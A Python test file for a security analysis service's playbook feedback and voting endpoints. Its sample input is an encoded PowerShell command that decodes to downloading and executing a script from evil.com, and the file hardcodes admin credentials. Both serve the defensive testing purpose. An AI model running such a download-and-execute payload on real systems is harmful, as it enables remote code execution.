"""Tests for the Playbook Feedback Loop feature.

Covers:
- Auth (login as admin)
- Async analysis job creation → status:done + playbooks_used snapshot
- GET/POST /api/analyze/{job_id}/feedback (up/down/none toggling, same-vote no-op)
- Counter math on admin_models (feedback_pos/neg/weight) via toggle flows
- GET /api/admin/playbooks/{playbook_id}/votes audit log
- Weight-based sort on GET /api/admin/models?kind=playbook
- Error cases: bad job id, invalid vote value
- Regression: benchmark endpoint still 100%
"""
import os
import time
import pytest
import requests

def _load_base_url():
    v = os.environ.get("REACT_APP_BACKEND_URL")
    if not v:
        # read frontend .env
        try:
            with open("/app/frontend/.env") as f:
                for line in f:
                    if line.startswith("REACT_APP_BACKEND_URL="):
                        v = line.split("=", 1)[1].strip()
                        break
        except Exception:
            pass
    return (v or "").rstrip("/")

BASE_URL = _load_base_url()
assert BASE_URL, "REACT_APP_BACKEND_URL must be set"

ADMIN_EMAIL = "admin@nivxray.com"
ADMIN_PASSWORD = "NivXRay#2026!"

# A real PowerShell -Enc payload that will trigger AI + attach playbooks.
POWERSHELL_ENC = (
    "powershell.exe -NoP -NonI -W Hidden -Enc "
    "SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4A"
    "RABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8A"
    "bQAvAGEALgBwAHMAMQAnACkA"
)


@pytest.fixture(scope="module")
def token():
    r = requests.post(
        f"{BASE_URL}/api/auth/login",
        json={"email": ADMIN_EMAIL, "password": ADMIN_PASSWORD},
        timeout=15,
    )
    assert r.status_code == 200, f"login failed: {r.status_code} {r.text}"
    tok = r.json().get("access_token")
    assert tok, f"no access_token in response: {r.json()}"
    return tok


@pytest.fixture(scope="module")
def headers(token):
    return {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}


def _submit_and_wait(headers, raw: str = POWERSHELL_ENC, timeout: int = 120) -> dict:
    """POST /api/analyze/async and poll status until done. Returns final doc."""
    r = requests.post(
        f"{BASE_URL}/api/analyze/async",
        headers=headers,
        json={"input": raw, "describe": True, "use_ai_verdict": True},
        timeout=30,
    )
    assert r.status_code == 200, f"async submit failed: {r.status_code} {r.text}"
    job_id = r.json().get("job_id")
    assert job_id, f"no job_id: {r.json()}"

    t0 = time.time()
    doc = None
    while time.time() - t0 < timeout:
        s = requests.get(f"{BASE_URL}/api/analyze/status/{job_id}", headers=headers, timeout=15)
        assert s.status_code == 200, f"status err: {s.status_code} {s.text}"
        doc = s.json()
        if doc.get("status") in ("done", "error"):
            break
        time.sleep(2)
    assert doc and doc.get("status") == "done", f"job did not finish clean: {doc}"
    return doc


def _get_playbooks(headers):
    r = requests.get(f"{BASE_URL}/api/admin/models?kind=playbook", headers=headers, timeout=15)
    assert r.status_code == 200, f"list playbooks: {r.status_code} {r.text}"
    return r.json()


def _pb_stats(playbooks, pid):
    for p in playbooks:
        if p.get("id") == pid:
            return (
                int(p.get("feedback_pos") or 0),
                int(p.get("feedback_neg") or 0),
                int(p.get("feedback_weight") or 0),
            )
    raise AssertionError(f"playbook {pid} not in list")


# --------------------------- Tests --------------------------- #

def test_login(headers):
    assert headers.get("Authorization", "").startswith("Bearer ")


def test_async_job_attaches_playbooks(headers):
    doc = _submit_and_wait(headers)
    pbs = doc.get("playbooks_used")
    assert isinstance(pbs, list) and len(pbs) > 0, f"playbooks_used missing/empty: {pbs}"
    for p in pbs:
        assert p.get("id") and p.get("name"), f"bad playbook entry: {p}"


def test_feedback_get_initial_none(headers):
    doc = _submit_and_wait(headers)
    job_id = doc["job_id"]
    r = requests.get(f"{BASE_URL}/api/analyze/{job_id}/feedback", headers=headers, timeout=15)
    assert r.status_code == 200, r.text
    j = r.json()
    assert j["vote"] == "none"
    assert j["reason"] == ""
    assert j["history"] == []
    ids = [p["id"] for p in j["playbooks_used"]]
    doc_ids = [p["id"] for p in doc["playbooks_used"]]
    assert ids == doc_ids


def test_feedback_toggle_math(headers):
    """Full up→down→none→up cycle. Verify pos/neg/weight math on EACH playbook."""
    doc = _submit_and_wait(headers)
    job_id = doc["job_id"]
    pb_ids = [p["id"] for p in doc["playbooks_used"]]
    assert len(pb_ids) >= 1

    # Baseline stats
    baseline = {pid: _pb_stats(_get_playbooks(headers), pid) for pid in pb_ids}

    # (1) vote UP
    r = requests.post(
        f"{BASE_URL}/api/analyze/{job_id}/feedback",
        headers=headers, json={"vote": "up", "reason": "Perfect"}, timeout=15,
    )
    assert r.status_code == 200, r.text
    j = r.json()
    assert j["vote"] == "up" and j["prev_vote"] == "none" and j["changed"] is True
    assert set(j["playbook_ids"]) == set(pb_ids)

    after_up = {pid: _pb_stats(_get_playbooks(headers), pid) for pid in pb_ids}
    for pid in pb_ids:
        b_pos, b_neg, b_w = baseline[pid]
        a_pos, a_neg, a_w = after_up[pid]
        assert a_pos == b_pos + 1, f"{pid} pos: {b_pos} -> {a_pos}"
        assert a_neg == b_neg, f"{pid} neg changed unexpectedly"
        assert a_w == b_w + 1, f"{pid} weight: {b_w} -> {a_w}"

    # (2) toggle to DOWN — pos should DECREMENT (reverse of up) and neg INCREMENT
    r = requests.post(
        f"{BASE_URL}/api/analyze/{job_id}/feedback",
        headers=headers, json={"vote": "down", "reason": "Missed a stage"}, timeout=15,
    )
    assert r.status_code == 200, r.text
    j = r.json()
    assert j["vote"] == "down" and j["prev_vote"] == "up" and j["changed"] is True

    after_down = {pid: _pb_stats(_get_playbooks(headers), pid) for pid in pb_ids}
    for pid in pb_ids:
        b_pos, b_neg, b_w = baseline[pid]
        a_pos, a_neg, a_w = after_down[pid]
        assert a_pos == b_pos, f"{pid} pos should revert: {b_pos} -> {a_pos}"
        assert a_neg == b_neg + 1, f"{pid} neg: {b_neg} -> {a_neg}"
        assert a_w == b_w - 1, f"{pid} weight: {b_w} -> {a_w} (want -1 from baseline)"

    # (3) retract to NONE — everything back to baseline
    r = requests.post(
        f"{BASE_URL}/api/analyze/{job_id}/feedback",
        headers=headers, json={"vote": "none"}, timeout=15,
    )
    assert r.status_code == 200, r.text
    j = r.json()
    assert j["vote"] == "none" and j["prev_vote"] == "down" and j["changed"] is True

    after_none = {pid: _pb_stats(_get_playbooks(headers), pid) for pid in pb_ids}
    for pid in pb_ids:
        assert after_none[pid] == baseline[pid], (
            f"{pid} did not revert to baseline. base={baseline[pid]} now={after_none[pid]}"
        )

    # GET now returns vote:none but history should be populated (3 entries)
    r = requests.get(f"{BASE_URL}/api/analyze/{job_id}/feedback", headers=headers, timeout=15)
    j = r.json()
    assert j["vote"] == "none"
    assert len(j["history"]) >= 3, f"history should record all 3 changes: {j['history']}"


def test_feedback_same_vote_no_double_count(headers):
    doc = _submit_and_wait(headers)
    job_id = doc["job_id"]
    pb_ids = [p["id"] for p in doc["playbooks_used"]]
    baseline = {pid: _pb_stats(_get_playbooks(headers), pid) for pid in pb_ids}

    # first up
    r = requests.post(f"{BASE_URL}/api/analyze/{job_id}/feedback",
                       headers=headers, json={"vote": "up"}, timeout=15)
    assert r.json()["changed"] is True
    # second up (same vote)
    r = requests.post(f"{BASE_URL}/api/analyze/{job_id}/feedback",
                       headers=headers, json={"vote": "up"}, timeout=15)
    j = r.json()
    assert j["changed"] is False, f"same vote should not double-count: {j}"

    after = {pid: _pb_stats(_get_playbooks(headers), pid) for pid in pb_ids}
    for pid in pb_ids:
        b_pos, b_neg, _ = baseline[pid]
        a_pos, a_neg, _ = after[pid]
        assert a_pos == b_pos + 1 and a_neg == b_neg, f"double counted: base={baseline[pid]} after={after[pid]}"

    # cleanup - retract
    requests.post(f"{BASE_URL}/api/analyze/{job_id}/feedback",
                   headers=headers, json={"vote": "none"}, timeout=15)


def test_admin_playbook_votes_audit(headers):
    doc = _submit_and_wait(headers)
    job_id = doc["job_id"]
    pb_ids = [p["id"] for p in doc["playbooks_used"]]

    # cast an up vote so an audit entry exists
    requests.post(f"{BASE_URL}/api/analyze/{job_id}/feedback",
                   headers=headers, json={"vote": "up", "reason": "audit-test"}, timeout=15)

    for pid in pb_ids:
        r = requests.get(f"{BASE_URL}/api/admin/playbooks/{pid}/votes", headers=headers, timeout=15)
        assert r.status_code == 200, r.text
        j = r.json()
        assert j["playbook_id"] == pid
        votes = j["votes"]
        assert isinstance(votes, list) and len(votes) >= 1
        # Find our vote
        mine = [v for v in votes if v["job_id"] == job_id]
        assert mine, f"our vote not in audit for {pid}: {votes[:3]}"
        v = mine[0]
        for k in ("job_id", "analyst_email", "vote", "reason", "at"):
            assert k in v, f"missing {k} in audit entry {v}"
        assert v["analyst_email"] == ADMIN_EMAIL
        assert v["vote"] == "up"
        assert v["reason"] == "audit-test"

    # cleanup
    requests.post(f"{BASE_URL}/api/analyze/{job_id}/feedback",
                   headers=headers, json={"vote": "none"}, timeout=15)


def test_weight_based_sort(headers):
    """Upvote a specific playbook across TWO fresh jobs; expect it to bubble to top."""
    # Create two independent jobs and upvote both — the playbooks shared by both
    # jobs (typically both built-ins) will get +2. Then verify sort DESC by weight.
    doc1 = _submit_and_wait(headers)
    doc2 = _submit_and_wait(headers)

    # snapshot baseline weights
    before = {p["id"]: int(p.get("feedback_weight") or 0) for p in _get_playbooks(headers)}

    for d in (doc1, doc2):
        r = requests.post(f"{BASE_URL}/api/analyze/{d['job_id']}/feedback",
                           headers=headers, json={"vote": "up", "reason": "weight-sort test"}, timeout=15)
        assert r.status_code == 200 and r.json()["changed"] is True

    listing = _get_playbooks(headers)
    weights = [int(p.get("feedback_weight") or 0) for p in listing]
    # Verify DESC order
    assert weights == sorted(weights, reverse=True), f"not sorted by weight desc: {weights}"

    # The playbooks used in doc1 should each have weight increased by >=1 (2 if in both jobs)
    touched = set([p["id"] for p in doc1["playbooks_used"]]) | set([p["id"] for p in doc2["playbooks_used"]])
    after = {p["id"]: int(p.get("feedback_weight") or 0) for p in listing}
    for pid in touched:
        assert after[pid] > before.get(pid, 0), f"{pid} weight didn't rise: {before.get(pid,0)}->{after[pid]}"

    # cleanup
    for d in (doc1, doc2):
        requests.post(f"{BASE_URL}/api/analyze/{d['job_id']}/feedback",
                       headers=headers, json={"vote": "none"}, timeout=15)


def test_error_bad_job_id(headers):
    r = requests.post(f"{BASE_URL}/api/analyze/BADID/feedback",
                       headers=headers, json={"vote": "up"}, timeout=15)
    assert r.status_code == 404, f"expected 404, got {r.status_code} {r.text}"


def test_error_invalid_vote(headers):
    doc = _submit_and_wait(headers)
    r = requests.post(f"{BASE_URL}/api/analyze/{doc['job_id']}/feedback",
                       headers=headers, json={"vote": "sideways"}, timeout=15)
    assert r.status_code == 400, f"expected 400, got {r.status_code} {r.text}"


def test_benchmark_regression(headers):
    r = requests.post(f"{BASE_URL}/api/admin/samples/benchmark/all", headers=headers, timeout=180)
    assert r.status_code == 200, r.text
    j = r.json()
    pct = j.get("pass_pct")
    assert pct == 100.0, f"benchmark regressed: pass_pct={pct} body={j}"
